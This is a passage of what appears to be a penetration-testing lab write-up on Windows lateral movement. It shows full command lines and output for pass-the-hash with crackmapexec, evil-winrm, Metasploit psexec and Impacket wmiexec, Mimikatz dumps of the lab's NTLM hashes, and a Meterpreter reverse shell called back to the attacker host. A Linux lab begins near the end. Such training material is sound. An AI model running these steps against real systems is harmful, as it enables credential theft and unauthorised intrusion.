                                    Forged by @byt3bl33d3r using the powah of dank memes

                                                      Version: 5.0.2dev
                                                     Codename: P3l1as

optional arguments:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {ssh,mssql,winrm,smb}
    ssh                 own stuff using SSH
    mssql               own stuff using MSSQL
    winrm               own stuff using WINRM ←
    smb                 own stuff using SMB

Ya feelin' a bit buggy all of a sudden?
```

**Explanation:** The `crackmapexec` tool can target various protocols, including WinRM, which is what we need for this lab.

_Confirm the options specific to WinRM with `crackmapexec` to determine the appropriate parameters for our attack._

`crackmapexec winrm --help`:
```
usage: crackmapexec winrm [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k] [--aesKey]
                          [--kdcHost] [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT] [-M MODULE]
                          [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options] [--server {http,https}] [--server-host HOST]
                          [--server-port PORT] [-H HASH [HASH ...]] [--no-bruteforce] [--continue-on-success] [-d DOMAIN | --local-auth]
                          [--no-output] [-x COMMAND] [-X PS_COMMAND]
                          [target [target ...]]

positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus
                        file(s) ←

optional arguments:
  -h, --help            show this help message and exit
  -id CRED_ID [CRED_ID ...]
                        database credential ID(s) to use for authentication
  -u USERNAME [USERNAME ...] ←
                        username(s) or file(s) containing usernames
  -p PASSWORD [PASSWORD ...] ←
                        password(s) or file(s) containing passwords
  -k, --kerberos        Use Kerberos authentication from ccache file (KRB5CCNAME)
  --aesKey              AES key to use for Kerberos Authentication (128 or 256 bits)
  --kdcHost             IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  --gfail-limit LIMIT   max number of global failed login attempts
  --ufail-limit LIMIT   max number of failed login attempts per username
  --fail-limit LIMIT    max number of failed login attempts per host
  -M MODULE, --module MODULE
                        module to use
  -o MODULE_OPTION [MODULE_OPTION ...]
                        module options
  -L, --list-modules    list available modules
  --options             display module options
  --server {http,https}
                        use the selected server (default: https)
  --server-host HOST    IP to bind the server to (default: 0.0.0.0)
  --server-port PORT    start the server on the specified port
  -H HASH [HASH ...], --hash HASH [HASH ...]
                        NTLM hash(es) or file(s) containing NTLM hashes
  --no-bruteforce       No spray when using file for username and password (user1 => password1, user2 => password2
  --continue-on-success
                        continues authentication attempts even after successes
  -d DOMAIN             domain to authenticate to
  --local-auth          authenticate locally to each target

Command Execution:
  Options for executing commands

  --no-output           do not retrieve command output
  -x COMMAND            execute the specified command
  -X PS_COMMAND         execute the specified PowerShell command
```

_Attempt to authenticate to the target machine's WinRM service using known credentials._

`crackmapexec winrm 10.4.18.254 -u administrator -p 'rocknroll_123321' --local-auth`:
```
WINRM       10.4.18.254     5985   NONE             [*] http://10.4.18.254:5985/wsman
WINRM       10.4.18.254     5985   NONE             [+] 10.4.18.254\administrator:rocknroll_123321 (Pwn3d!) ←
```

_Verify the current user on the target machine using a simple command to confirm administrative access._

`crackmapexec winrm 10.4.18.254 -u administrator -p 'rocknroll_123321' --local-auth -x 'whoami'`:
```
WINRM       10.4.18.254     5985   NONE             [*] http://10.4.18.254:5985/wsman
WINRM       10.4.18.254     5985   NONE             [+] 10.4.18.254\administrator:rocknroll_123321 (Pwn3d!)
WINRM       10.4.18.254     5985   NONE             [+] Executed command
WINRM       10.4.18.254     5985   NONE             win-omcnbkr66mn\administrator ←
```

_Review the available options for `evil-winrm`, a specialized tool for interacting with WinRM services, to plan the next steps in the attack._

`evil-winrm.rb --help`:
```
Evil-WinRM shell v2.3

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
    -S, --ssl                        Enable ssl ←
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path ←
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required) ←
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required) ←
    -p, --password PASS              Password ←
    -H, --hash HASH                  NTHash ←
    -P, --port PORT                  Remote host port (default 5985) ←
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -h, --help                       Display this help message
```

**Explanation:** The help menu for `evil-winrm` shows that it supports script and executable loading, which will be critical for loading `Invoke-Mimikatz.ps1` onto the target machine.

_Establish a connection to the target machine using `evil-winrm` to gain a more interactive shell._

`evil-winrm.rb -u administrator -p 'rocknroll_123321' -i 10.4.18.254`:
```
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint ←
```

**Explanation:** This command opens an Evil-WinRM session as the administrator on the target machine, providing us with a powerful interface for further operations.

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Confirm that the session is indeed running as the administrator to ensure full privileges._

`whoami`:
```
win-omcnbkr66mn\administrator ←
```

<span style="color: #e57373;">**Attacker machine**</span>.

_List the files in the local directory to confirm the presence of `Invoke-Mimikatz.ps1`, which will be used for further exploitation._

`ls -alps /root/Desktop/tools/scripts`:
```
total 3084
   4 drwxr-xr-x 1 root root    4096 Oct 14  2020 ./
   4 drwxr-xr-x 1 root root    4096 Oct 14  2020 ../
3072 -rw-rw-r-- 1 root root 3143746 Oct  2  2020 Invoke-Mimikatz.ps1 ←
   4 drwxr-xr-x 2 root root    4096 Feb 17  2020 memcache/
```

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Exit the current session to prepare for executing Mimikatz._

`exit`

<span style="color: #e57373;">**Attacker machine**</span>.

_Re-establish the connection with the target machine using `evil-winrm`, this time specifying the path to the Mimikatz script._

`evil-winrm.rb -u administrator -p 'rocknroll_123321' -i 10.4.18.254 -s /root/Desktop/tools/scripts`:
```
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint ←
```

**Explanation:** This command connects to the target and loads the Mimikatz script directory, allowing us to execute the script directly on the target machine.

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Run the Mimikatz script to begin extracting credentials from the target machine._

`Invoke-Mimikatz.ps1`

`menu`:
```
   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/ 
              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers  
 
[+] Bypass-4MSI 
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary 
[+] Invoke-Mimikatz ←
```

_Execute the `Invoke-Mimikatz` command to extract all logon passwords, including NTLM hashes, which can be used for further lateral movement._

`Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'`:
```
Hostname: WIN-OMCNBKR66MN / S-1-5-21-2563855374-3215282501-1490390052

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

...

Authentication Id : 0 ; 250091 (00000000:0003d0eb)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : WIN-OMCNBKR66MN
Logon Server      : WIN-OMCNBKR66MN
Logon Time        : 8/21/2024 10:10:39 AM
SID               : S-1-5-21-2563855374-3215282501-1490390052-500
	msv :
	 [00010000] CredentialKeys
	 * NTLM     : 7ff3c58fce728b60f1ff8718c4e9ca67
	 * SHA1     : 78ac4b57f900c1589c7d79bc54bcfd1e7859b381
	 [00000003] Primary
	 * Username : Administrator ←
	 * Domain   : WIN-OMCNBKR66MN
	 * NTLM     : 7ff3c58fce728b60f1ff8718c4e9ca67 ←
	 * SHA1     : 78ac4b57f900c1589c7d79bc54bcfd1e7859b381
	tspkg :
	wdigest :
	 * Username : Administrator
	 * Domain   : WIN-OMCNBKR66MN
	 * Password : (null)
	kerberos :
	 * Username : Administrator
	 * Domain   : WIN-OMCNBKR66MN
	 * Password : (null)
	ssp :
	credman :
```

_Exit the session once the hash has been obtained._

`exit`

_Attempt to authenticate to the WinRM service using the extracted NTLM hash to confirm its validity._

`evil-winrm.rb -u administrator -H 7ff3c58fce728b60f1ff8718c4e9ca67 -i 10.4.18.254`:
```
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint ←
```

**Explanation:** Successfully connecting using the NTLM hash confirms its validity, allowing further exploitation of the target network.

_Exit the session after confirming access with the NTLM hash._

`exit`

<span style="color: #e57373;">**Attacker machine**</span>.

_Switch to PowerShell to prepare for more advanced exploitation or persistence techniques._

`pwsh`:
```
PowerShell 7.0.0
Copyright (c) Microsoft Corporation. All rights reserved.

https://aka.ms/powershell
Type 'help' to get help.
```

_Store the administrator credentials securely in a PowerShell variable for easy re-use._

`$cred = Get-Credential`:
```
PowerShell credential request
Enter your credentials.
User: administrator ←
Password for user administrator: **************** ←
```

`$cred`:
```
UserName                          Password
--------                          --------
administrator System.Security.SecureString ←
```

**Explanation:** This output confirms that the credentials have been securely stored in the `$cred` variable.

_Attempt to establish a new PowerShell session to the target machine using the stored credentials._

`Enter-PSSession -ComputerName 10.4.18.254 -Authentication Negotiate -Credential $cred`:
```
Enter-PSSession: Connecting to remote server 10.4.18.254 failed with the following error message : MI_RESULT_FAILED For more information, see the about_Remote_Troubleshooting Help topic. ←
```

**Explanation:** The session fails because the target machine has not been configured to allow PowerShell remoting, highlighting the need to enable it.

<span style="color: #64b5f6;">**Target (victim) machine: `Administrator` privilege**</span>.

_Enable PowerShell remoting on the target machine to allow future remote sessions._

`Enable-PSRemoting`:
```
WinRM Quick Configuration
Running command "Set-WSManQuickConfig" to enable remote management of this computer by using the Windows Remote
Management (WinRM) service.
 This includes:
    1. Starting or restarting (if already started) the WinRM service
    2. Setting the WinRM service startup type to Automatic
    3. Creating a listener to accept requests on any IP address
    4. Enabling Windows Firewall inbound rule exceptions for WS-Management traffic (for http only).

Do you want to continue?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "Y"): A ←
WinRM is already set up to receive requests on this computer.
WinRM is already set up for remote management on this computer.

Confirm
Are you sure you want to perform this action?
Performing the operation "Set-PSSessionConfiguration" on target "Name: microsoft.powershell SDDL:
O:NSG:BAD:P(A;;GA;;;BA)(A;;GA;;;RM)S:P(AU;FA;GA;;;WD)(AU;SA;GXGW;;;WD). This lets selected users remotely run Windows
PowerShell commands on this computer.".
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "Y"): A ←
```

**Explanation:** Enabling PSRemoting ensures that future attempts to establish a remote PowerShell session will succeed, a key step in maintaining access.

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Attempt to establish the PowerShell session again, now that remoting is enabled._

`Enter-PSSession -ComputerName 10.4.18.254 -Authentication Negotiate -Credential $cred`

_Verify the user context of the new session to ensure it is running with administrative privileges._

`whoami`:
```
win-omcnbkr66mn\administrator ←
```

### Windows Pass-the-Hash with Metasploit - Theory

#### Pass-the-Hash (PtH)

Pass-the-Hash (PtH) is a technique used in lateral movement attacks where an attacker uses a hashed version of a password (commonly an NTLM hash) to authenticate without needing the plaintext password.

This technique is especially relevant in Windows environments, where NTLM authentication is still supported for compatibility with older systems or non-domain environments.

Pass-the-Hash allows attackers to impersonate users, gain unauthorized access, and move laterally across a network.

##### Pass-the-Hash (PtH) Attacks

1. **Obtaining Hashes**
Attackers acquire NTLM hashes through various means, such as credential dumping, memory scraping, or capturing network traffic.
Tools like Mimikatz, Hashcat, or Metasploit can be used to extract or manipulate NTLM hashes from compromised systems.

2. **Using NTLM Hashes for Authentication**
Once the attacker has an NTLM hash, they can use it to authenticate with other systems or services without needing the plaintext password.
The hash is used to respond to an NTLM challenge, effectively bypassing the need for a plaintext password.

3. **Connecting to Remote Systems**
Attackers can use the NTLM hash to establish connections with remote systems. Common methods include using Server Message Block (SMB), Windows Management Instrumentation (WMI), or Remote Desktop Protocol (RDP).
Tools like CrackMapExec, PsExec, or Impacket allow attackers to authenticate and execute commands on remote systems using Pass-the-Hash.

4. **Lateral Movement**
Using Pass-the-Hash, attackers can move laterally across a network, connecting to other systems and performing various tasks, such as remote command execution, data exfiltration, or privilege escalation.
This technique is particularly effective because it relies on legitimate authentication mechanisms, often blending in with normal network activity.

### Windows Pass-the-Hash with Metasploit - Lab

#### Lab Environment

A Kali GUI machine and a target machine running a vulnerable SMB server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (`/root/Desktop/target`). 

Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the vulnerability using the appropriate Metasploit module.

The following Administrator NTLM hash may be used to access the service: `5c4d59391f656d5958dab124ffeabc20`.

**Objective**: Exploit the application and retrieve the flag!

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

_Obtain the target machine's IP address from the provided file to perform subsequent operations on the correct target._

`cat /root/Desktop/target`:
```
Target IP Address : 10.4.23.8 ←
```

_Use the `ping` command to check connectivity to the target machine, ensuring that it is reachable and verifying network stability._

`ping -c 3 10.4.23.8`:
```
PING 10.4.23.8 (10.4.23.8) 56(84) bytes of data.
64 bytes from 10.4.23.8: icmp_seq=1 ttl=125 time=9.84 ms
64 bytes from 10.4.23.8: icmp_seq=2 ttl=125 time=9.58 ms
64 bytes from 10.4.23.8: icmp_seq=3 ttl=125 time=9.48 ms

--- 10.4.23.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms ←
rtt min/avg/max/mdev = 9.476/9.632/9.838/0.151 ms
```

_Use `nmap` to perform a thorough scan of the target machine, identifying all open ports and services to understand the attack surface._

`nmap -Pn -sS -sV 10.4.23.8 -p-`:
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2024-08-20 22:07 IST
Nmap scan report for 10.4.23.8
Host is up (0.0097s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? ←
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.91 seconds
```

_Refine the focus to the SMB service running on port 445 by enumerating supported SMB dialects to assist in selecting the correct exploitation technique._

`nmap --script smb-protocols 10.4.23.8 -p 445`:
```
Starting Nmap 7.91 ( https://nmap.org ) at 2024-08-20 22:07 IST
Nmap scan report for 10.4.23.8
Host is up (0.0099s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: ←
|   dialects: 
|     2.02
|     2.10
|     3.00
|     3.02
|_    3.11

Nmap done: 1 IP address (1 host up) scanned in 6.44 seconds
```

_Confirm your attacking machine's IP address, which will be used later to configure the Metasploit reverse shell payload._

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.5  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:05  txqueuelen 0  (Ethernet)
        RX packets 4009  bytes 325813 (318.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4037  bytes 2560458 (2.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.39.4  netmask 255.255.255.0  broadcast 10.10.39.255 ←
        ether 02:42:0a:0a:27:04  txqueuelen 0  (Ethernet)
        RX packets 53371  bytes 2883334 (2.7 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 54037  bytes 3134899 (2.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 13689  bytes 31136468 (29.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 13689  bytes 31136468 (29.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

_Open Metasploit, search for the `psexec` module, and configure it to execute a payload on the target machine using the provided NTLM hash._

`msfconsole -q`

`search psexec`, `use exploit/windows/smb/psexec`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set LHOST 10.10.39.4`, `set LPORT 4444`, `set RHOSTS 10.4.23.8`, `set SMBUser Administrator`, `set SMBPass 00000000000000000000000000000000:5c4d59391f656d5958dab124ffeabc20`, `exploit`:
```
[*] Started reverse TCP handler on 10.10.39.4:4444 
[*] 10.4.23.8:445 - Connecting to the server...
[*] 10.4.23.8:445 - Authenticating to 10.4.23.8:445 as user 'Administrator'... ←
[*] 10.4.23.8:445 - Selecting PowerShell target
[*] 10.4.23.8:445 - Executing the payload...
[+] 10.4.23.8:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.4.23.8
[*] Meterpreter session 1 opened (10.10.39.4:4444 -> 10.4.23.8:49763) at 2024-08-20 22:17:02 +0530 ←
```

**Explanation:** The `psexec` Metasploit module is used to execute commands on a remote Windows machine using the provided NTLM hash. After configuring the payload with the appropriate options, a Meterpreter session is opened, indicating successful exploitation.

_List available sessions to confirm that the Meterpreter session is active and select it for interaction._

`sessions`, `sessions -i 1`

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Check the user context of the Meterpreter session to confirm that it is running with `NT AUTHORITY\SYSTEM` privileges._

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM ←
```

_Migrate the Meterpreter process to `lsass.exe` to ensure persistence and stability of the session by attaching to a critical system process._

`migrate -N lsass.exe`:
```
[*] Migrating from 3232 to 784...
[*] Migration completed successfully. ←
```

_Use the shell command to search for files with the keyword `flag` and retrieve the contents to obtain the flag for the lab._

`shell`, `where /r C:\ ""*flag*"`:
```
C:\flag.txt ←
```

_Read the contents of the flag file to complete the objective._

`type C:\flag.txt`:
```
oiu21432123avvcde1vsdfxxr323p4sewq412 ←
```

### Windows Pass-the-Hash with WMIExec - Theory

#### WMI

Windows Management Instrumentation (WMI) is a Microsoft framework for managing and monitoring Windows-based systems.

It allows administrators to perform various tasks, such as gathering system information, executing scripts, and controlling system operations, all through a consistent interface.

WMI can be accessed locally on a Windows system or remotely over a network, providing flexibility for system administration.

WMI relies on underlying protocols for remote communication, primarily Distributed Component Object Model (DCOM) and Remote Procedure Call (RPC).

- **Port 135**: This is the RPC Endpoint Mapper, used to discover other RPC-based services on a remote system. WMI uses this port to initiate remote communication.

- **Dynamic RPC Ports**: After connecting to port 135, the communication is redirected to a dynamically assigned RPC port. These dynamic ports typically fall within the range of 49152-65535, though this range can be customized through Group Policy or registry settings.

#### WMIExec

`wmiexec` is a technique used to execute commands or scripts on remote Windows systems via Windows Management Instrumentation (WMI).

In the context of lateral movement, `wmiexec` provides a way for attackers or penetration testers to interact with remote systems without requiring additional services or software installations.

This approach allows attackers to move laterally across a network, executing code remotely to gain further access or escalate privileges.

##### How WMIExec Works

- **WMI**: Windows Management Instrumentation is a framework that allows interaction with system components and management of various tasks on Windows systems. WMI is commonly used for remote management and administration.

- **DCOM and RPC**: WMI operates over Distributed Component Object Model (DCOM) and Remote Procedure Call (RPC), allowing remote communication with Windows systems.

- **Remote Command Execution**: `wmiexec` uses WMI to remotely execute commands or scripts on a target system. It does so by sending a WMI request to execute a command, and then retrieves the output from the remote system.

#### Lateral Movement With WMIExec

- **Remote Command Execution**: `wmiexec` allows execution of commands on remote systems, providing a method to interact with and manipulate the target system.

- **Privilege Escalation**: `wmiexec` can be used to execute commands with elevated privileges, potentially allowing attackers to escalate their access rights on the remote system.

- **Minimal Footprint**: `wmiexec` does not require additional software installations or creating new services. This minimal footprint makes it less detectable and can bypass certain security controls. The ability to execute commands without leaving extensive traces makes it attractive for lateral movement.

Several tools incorporate `wmiexec` functionality, allowing attackers or penetration testers to execute commands via WMI. Here are some examples:

- **Impacket**: A popular collection of Python tools for interacting with Windows network protocols. Impacket's `wmiexec.py` allows remote command execution via WMI.

- **CrackMapExec**: A multi-functional penetration testing tool that includes WMI-based lateral movement capabilities.

- **Custom Scripts**: Attackers and penetration testers may create custom scripts that leverage WMI for lateral movement.

### Windows Pass-the-Hash with WMIExec - Lab

#### Lab Environment

A Kali GUI machine and a target machine running a vulnerable WMI service are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (`/root/Desktop/target`). 

Your task is to fingerprint the WMI service using the tools available on the Kali machine and then use the WMIExec tool to perform a post-exploitation on the WMI service. The WMIExec uses a similar approach to SMBExec, but it executes commands through WMI. Also, it generates fewer event logs.

The following Administrator NTLM hash may be used to access the service: `5c4d59391f656d5958dab124ffeabc20`.

**Objective**: Exploit the target machine using provided NTLM hash and retrieve the flag!

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

_Obtain the target machine's IP address from the provided file to perform subsequent operations on the correct target._

`cat /root/Desktop/target`:
```
Target IP Address : 10.4.22.194 ←
```

_Use the `ping` command to check connectivity to the target machine, ensuring that it is reachable and verifying network stability._

`ping -c 3 10.4.22.194`:
```
PING 10.4.22.194 (10.4.22.194) 56(84) bytes of data.
64 bytes from 10.4.22.194: icmp_seq=1 ttl=125 time=9.86 ms
64 bytes from 10.4.22.194: icmp_seq=2 ttl=125 time=9.52 ms
64 bytes from 10.4.22.194: icmp_seq=3 ttl=125 time=9.92 ms

--- 10.4.22.194 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms ←
rtt min/avg/max/mdev = 9.519/9.764/9.919/0.175 ms
```

_Use `nmap` to perform a thorough scan of the target machine, identifying all open ports and services to understand the attack surface._

`nmap -Pn -sS -sV 10.4.22.194 -p-`:
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2024-08-20 22:25 IST
Nmap scan report for 10.4.22.194
Host is up (0.0098s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC ←
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC ←
49665/tcp open  msrpc         Microsoft Windows RPC ←
49666/tcp open  msrpc         Microsoft Windows RPC ←
49667/tcp open  msrpc         Microsoft Windows RPC ←
49668/tcp open  msrpc         Microsoft Windows RPC ←
49669/tcp open  msrpc         Microsoft Windows RPC ←
49670/tcp open  msrpc         Microsoft Windows RPC ←
49671/tcp open  msrpc         Microsoft Windows RPC ←
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.55 seconds
```

**Explanation:** The results highlight several open ports, including those associated with RPC and WMI, which are critical for executing the WMIExec attack.

_Review the options and usage of the `wmiexec.py` script to understand how to execute commands on the target machine using WMI with the provided NTLM hash._

`wmiexec.py --help`:
```
Impacket v0.9.24.dev1+20210814.5640.358fc7c - Copyright 2021 SecureAuth Corporation

usage: wmiexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-silentcommand] [-debug] [-codec CODEC] [-shell-type {cmd,powershell}]
                  [-com-version MAJOR_VERSION:MINOR_VERSION] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
                  [-A authfile] [-keytab KEYTAB]
                  target [command ...]

Executes a semi-interactive shell using Windows Management Instrumentation.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address> ←
  command               command to execute at the target. If empty it will launch a semi-interactive shell

optional arguments:
  -h, --help            show this help message and exit
  -share SHARE          share where the output will be grabbed from (default ADMIN$)
  -nooutput             whether or not to print the output (no SMB connection created)
  -ts                   Adds timestamp to every logging output
  -silentcommand        does not execute cmd.exe to run given command (no output)
  -debug                Turn DEBUG output ON
  -codec CODEC          Sets encoding used (codec) from the target's output (default "utf-8"). If errors are detected, run chcp.com at the target, map
                        the result with https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py again with -codec
                        and the corresponding codec
  -shell-type {cmd,powershell}
                        choose a command processor for the semi-interactive shell ←
  -com-version MAJOR_VERSION:MINOR_VERSION
                        DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH ←
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials
                        cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
  -A authfile           smbclient/mount.cifs-style authentication file. See smbclient man page's -A option.
  -keytab KEYTAB        Read keys for SPN from keytab file
```

_Execute the `wmiexec.py` script to obtain a shell on the target machine using the NTLM hash._

`wmiexec.py administrator@10.4.22.194 -hashes 00000000000000000000000000000000:5c4d59391f656d5958dab124ffeabc20 -shell-type powershell`:
```
Impacket v0.9.24.dev1+20210814.5640.358fc7c - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute ←
[!] Press help for extra shell commands
```

**Explanation:** The `wmiexec.py` script is used to launch a semi-interactive shell on the target machine by leveraging the provided NTLM hash.

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Check the user context of the Meterpreter session to confirm that it is running with `Administrator` privileges._

`whoami`:
```
attackdefense\administrator ←
```

_Use the shell command to search for files with the keyword `flag` and retrieve the contents to obtain the flag for the lab._

`where /r C:\ ""*flag*"`:
```
C:\flag.txt ←
```

_Read the contents of the flag file to complete the objective._

`type C:\flag.txt`:
```
oiu21432123avvcde1vsdfxxr323p4sewq412 ←
```

---

## Linux Lateral Movement

### Linux Lateral Movement Techniques - Lab

#### Lab Environment

This is a simulated assumed breach scenario. You have a direct connection to a simulated corporate network.

Now, to take it further you are provided phished credentials of a user:
- Username: "sansa" 
- Password: "welcome@123".

In order to measure the progress, there are seven flags hidden on four machines of the network. The passwords of all users (except user `sansa`) are very strong and random, so dictionary attacks won't succeed. Also, no vulnerabilities exist on the systems. So, focus on local artifacts on systems to move further. 

**Objective**: Collect all seven flags.

How to solve this?
- Metasploit is installed on the Kali instance you will get access to
- You are free to use any tools you like.

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.14  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:0e  txqueuelen 0  (Ethernet)
        RX packets 105  bytes 9597 (9.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 89  bytes 312312 (304.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.1.28.2  netmask 255.255.255.0  broadcast 192.1.28.255 ←
        ether 02:42:c0:01:1c:02  txqueuelen 0  (Ethernet)
        RX packets 15  bytes 1306 (1.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
